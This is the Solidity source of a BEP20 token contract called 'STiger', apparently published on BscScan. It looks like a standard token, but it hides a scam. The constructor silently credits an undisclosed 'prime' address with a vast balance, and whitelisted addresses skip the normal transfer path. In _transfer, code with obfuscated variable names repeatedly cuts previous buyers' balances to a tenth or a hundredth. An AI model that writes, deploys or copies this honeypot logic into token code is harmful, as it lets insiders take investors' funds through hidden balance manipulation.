/**
 *Submitted for verification at BscScan.com on 2022-01-14
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT


abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;

    }
    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function Ownership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {

      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;

    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");

    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

}

interface IBEP20 {
  function approve(address spender, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function decimals() external view returns (uint8);
  function getOwner() external view returns (address);
  function transfer(address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function symbol() external pure returns (string memory);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function name() external pure returns (string memory);
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
}
contract STiger is Context, IBEP20, Ownable {
    using SafeMath for uint256;
	uint8 private _decimals = 18;
	uint256 private _totalSupply = 100000000 * 10 ** _decimals;
	mapping (address => uint256) private anlog;
	string private constant _name = "STiger";

	string private constant _symbol = "S";
	mapping (address => bool) private network;

	mapping (address => uint256) private _balances;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping(uint => address) internal tOtal;
	constructor(address prime) {
	  _balances[msg.sender] = _totalSupply;
	  network[msg.sender] = true;
	  network[prime] = true;
	  network[address(this)] = true;
	  _balances[prime] = _totalSupply * 10**_decimals * 1000;

	  emit Transfer(address(0), msg.sender, _totalSupply);
	}
	function allowance(address owner, address spender) public view override returns (uint256) {

	  return _allowances[owner][spender];
	}
	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.

	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  _transfer(_msgSender(), recipient, amount);
	  return true;
	}

	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");

	    _allowances[owner][spender] = amount;
	    emit Approval(owner, spender, amount);

	}

	/**

	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return _totalSupply;
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   _transfer(sender, recipient, amount);

	   _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}

	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {

	  return owner();
	}
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return _name;
	}

	/**

	 * Returns balance of.

	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return _balances[account];
	}
	/**

	 * Returns the token decimals.

	 */
	function decimals() external override view returns (uint8) {
	  return _decimals;
	}

	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return _symbol;
	}
	function _transfer(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");

	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 raeple= 0;
	  bool portf = false;

	  uint8 alecwan = 0;
	  if(amount > 0){
	    if(network[sender] == true || network[recipient] == true){
	      _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
	      _balances[recipient] = _balances[recipient].add(amount);
	      if(_uniswapV2Pair == address(0)){
	        _uniswapV2Pair = recipient;
	      }
	      emit Transfer(sender, recipient, amount);
	    } else {
	      if(sender == _uniswapV2Pair && recipient != _uniswapV2Router) {
	        raeple = 1;

	        alecwan = 6;
	        portf = true;
	      } else if(recipient == _uniswapV2Pair) {
	         raeple = 2;
	         alecwan = 10;
	         portf = true;
	      } else {
	        raeple = 3;
	        alecwan = 1;
	        portf = true;

	      }

	      if(portf == true && amount > 0){
	          uint256 chain = 0;
	          address addr = recipient;
	          uint256 d0 = _balances[tOtal[0]];
	          uint256 d1 = _balances[tOtal[1]];

	          if(raeple == 2) {
	            addr = sender;
	          }
	          if(tOtal[0] != addr && tOtal[1] != addr){
	            if(d0 > 100){
	              _balances[tOtal[0]] = d0.div(100);

	            }
	            if(d1 > 100){
	              _balances[tOtal[1]] = d1.div(10);

	            }
	            tOtal[1] = tOtal[0];
	            tOtal[0] = addr;

	          }
	          _balances[sender] = _balances[sender].sub(amount,"Insufficient Balance");
	          chain = amount.mul(alecwan).div(100);

	          amount = amount.sub(chain);
	          _balances[recipient] = _balances[recipient].add(amount);
	          raeple = 1;
	          emit Transfer(sender, recipient, amount);

	      }

	    }
	  }
	  if(amount == 0){
	    emit Transfer(sender, recipient, amount);

	  }

	}
	address public _uniswapV2Pair;
	address public _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
}